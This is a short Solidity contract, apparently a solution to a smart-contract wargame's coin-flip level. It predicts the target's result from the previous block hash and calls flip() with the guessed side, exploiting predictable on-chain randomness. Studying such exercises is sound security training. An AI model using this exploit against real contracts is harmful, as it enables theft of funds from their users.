// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface ICoinFlip {
    function flip(bool _side) external returns(bool);
}

contract Attacker {
    ICoinFlip icoinFlip;
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinFlip) {
        icoinFlip = ICoinFlip(_coinFlip);
    }

    function flipAttack() public returns(bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        return icoinFlip.flip(blockValue/FACTOR == 1);
    }
}